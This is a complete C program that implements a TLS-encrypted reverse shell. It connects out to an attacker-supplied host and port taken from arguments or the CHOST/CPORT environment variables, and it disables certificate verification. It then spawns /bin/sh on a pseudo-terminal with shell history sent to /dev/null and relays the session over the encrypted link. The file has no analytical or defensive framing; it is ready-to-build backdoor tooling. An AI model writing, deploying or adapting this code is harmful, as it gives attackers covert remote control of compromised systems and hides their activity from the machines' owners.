#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <termios.h>
#include <signal.h>
#include <pty.h>
#include <sys/select.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>      

#include "mbedtls/net_sockets.h"
#include "mbedtls/ssl.h"
#include "mbedtls/entropy.h"
#include "mbedtls/ctr_drbg.h"
#include "mbedtls/debug.h"

#define TRUE        1
#define FALSE       0
#define BUFSIZE     4096
#define SHELL       "/bin/sh"
#define SSL_SEED    "vAn4rd_1n_th3_5P4c3"

void sig_child(int sig) {
    while(waitpid(-1, NULL, WNOHANG) > 0)
    ;
}

void loopshell(mbedtls_ssl_context *ssl, int pty, pid_t shellpid,int clientsock) {

    fd_set r;
    unsigned char buffer[BUFSIZE + 1];
    int result;

    while(TRUE) {
        FD_ZERO(&r);
        FD_SET(clientsock, &r);
        FD_SET(pty, &r);
        if((result = select((pty > clientsock) ? (pty + 1) : (clientsock + 1), &r, NULL, NULL, NULL)) == -1)
            exit(EXIT_FAILURE);
        
    
        if(FD_ISSET(clientsock, &r)) {
            memset(&buffer, 0, sizeof(buffer));
        
            if((result = mbedtls_ssl_read(ssl, buffer, BUFSIZE)) == -1) {
                exit(EXIT_FAILURE);

            } else if(result == 0) {
                exit(EXIT_SUCCESS);
            }

            unsigned char *p = memchr(buffer, 0x1d, result);

            if(p){
                unsigned char	wb[5];
                int	rlen = result - ((unsigned long) p - (unsigned long) buffer);
                struct	winsize ws;

                if (rlen > 5) rlen = 5;
                memcpy(wb, p, rlen);
                if (rlen < 5) {
                    mbedtls_ssl_read(ssl,  &wb[rlen], 5 - rlen);
                }

                ws.ws_xpixel = ws.ws_ypixel = 0;
                ws.ws_col = (wb[1] << 8) + wb[2];
                ws.ws_row = (wb[3] << 8) + wb[4];

                ioctl(pty, TIOCSWINSZ, &ws);
                kill(0, SIGWINCH);
                
                write(pty, buffer, (unsigned long) p - (unsigned long) buffer);
                rlen = ((unsigned long) buffer + result) - ((unsigned long) p+5);
                if (rlen > 0) write(pty, p+5, rlen);

            }else{
                if((write(pty, buffer, result) == -1))
                    exit(EXIT_FAILURE);
            }
                         
        }
        if(FD_ISSET(pty, &r)) {
            memset(&buffer, 0, sizeof(buffer));
        
            if((result = read(pty, buffer, BUFSIZE)) == -1) {
                exit(-1);
            } else if(result == 0) {
                exit(EXIT_SUCCESS);
            } else {
                if((mbedtls_ssl_write(ssl, buffer, result)) == -1)
                    exit(EXIT_FAILURE);
            }
        }
    }
}

void forkshell(mbedtls_ssl_context ssl, int sslfd) {

    int pty, tty;
    pid_t shellpid;
    pid_t controlpid;
    
    if ( openpty(&pty, &tty, NULL, NULL, NULL) < 0  ) // no pty no chocolate
        return;

    shellpid = fork();
    
    switch(shellpid) {
    case -1:
        exit(EXIT_FAILURE);
        break;
    
    case 0:

        close(0);
        close(1);
        close(2);

        close(pty);
        
        setsid();
        ioctl(tty, TIOCSCTTY);

        signal(SIGHUP, SIG_DFL);
        signal(SIGCHLD, SIG_DFL);
        

        dup2(tty, 0);
        dup2(tty, 1);
        dup2(tty, 2);
        close(tty);

        char * args[3];
        char * env[6];

        args[0] = SHELL;
        args[1] = "--norc";
        args[2] = 0;
        env[0]  = "PS1=~~(__)°> \\t \\e[33;1m\\u@\\e[36;1m\\h \\$\\e[0m ";
        //env[0]  = "PS1=~~(__)°> \\W:\\$ ";
        env[1]  = "TERM=xterm";
        env[2]  = "HISTFILE=/dev/null";
        env[3]  = "HOME=/tmp/";
        env[4]  = 0;

        execve(SHELL, args, env);
        
        exit(0);
        break;
    
    default:
        close(tty);
        break;
    }
    
    controlpid = fork();
    
    switch(controlpid) {
        case -1:
            exit(EXIT_FAILURE);
        break;

        case 0:
            loopshell(&ssl, pty, shellpid, sslfd);
        break;
    
        default:
            close(pty);
        break;
    }
}

int main(int argc, char **argv) {
    int ret;
    int flags;
    
    const char *hname;
    const char *sport;

    if (argc != 3){
        hname = getenv("CHOST");
        sport = getenv("CPORT");
        if(!(hname && sport))
            exit(EXIT_FAILURE); 
    } else {
        hname = argv[1];
        sport = argv[2];
    }
    
    mbedtls_net_context server_fd;
    mbedtls_entropy_context entropy;
    mbedtls_ctr_drbg_context ctr_drbg;
    mbedtls_ssl_context ssl;
    mbedtls_ssl_config conf;
    mbedtls_x509_crt cacert;

    mbedtls_net_init( &server_fd );
    mbedtls_ssl_init( &ssl );
    mbedtls_ssl_config_init( &conf );
    mbedtls_x509_crt_init( &cacert );
    mbedtls_ctr_drbg_init( &ctr_drbg );
    
    mbedtls_entropy_init( &entropy );
    
    if( ( ret = mbedtls_ctr_drbg_seed( &ctr_drbg, mbedtls_entropy_func, &entropy,
                           (const unsigned char *) SSL_SEED,
                           strlen( SSL_SEED ) ) ) != 0 ){
        exit(EXIT_FAILURE);
    }
    
    if( ( ret = mbedtls_net_connect( &server_fd, hname,
               sport, MBEDTLS_NET_PROTO_TCP ) ) != 0 )    
        exit(EXIT_FAILURE);
    
    if( ( ret = mbedtls_ssl_config_defaults( &conf,
                    MBEDTLS_SSL_IS_CLIENT,
                    MBEDTLS_SSL_TRANSPORT_STREAM,
                    MBEDTLS_SSL_PRESET_DEFAULT ) ) != 0 )
        exit(EXIT_FAILURE);

    mbedtls_ssl_conf_authmode( &conf, MBEDTLS_SSL_VERIFY_NONE ); 
    mbedtls_ssl_conf_ca_chain( &conf, &cacert, NULL );
    mbedtls_ssl_conf_rng( &conf, mbedtls_ctr_drbg_random, &ctr_drbg );

    if( ( ret = mbedtls_ssl_setup( &ssl, &conf ) ) != 0 )
        exit(EXIT_FAILURE);
    
    if( ( ret = mbedtls_ssl_set_hostname( &ssl, hname ) ) != 0 )
        exit(EXIT_FAILURE);

    mbedtls_ssl_set_bio( &ssl, &server_fd, mbedtls_net_send, mbedtls_net_recv, NULL );
    
    
    while( ( ret = mbedtls_ssl_handshake( &ssl ) ) != 0 ){
        if( ret != MBEDTLS_ERR_SSL_WANT_READ && ret != MBEDTLS_ERR_SSL_WANT_WRITE ){
            exit(EXIT_FAILURE);
        }
    }
    if( ( flags = mbedtls_ssl_get_verify_result( &ssl ) ) != 0 ){
        char vrfy_buf[512];
        mbedtls_x509_crt_verify_info( vrfy_buf, sizeof( vrfy_buf ), "  ! ", flags );
    }
    
    forkshell(ssl, server_fd.fd);
    return 0;
}

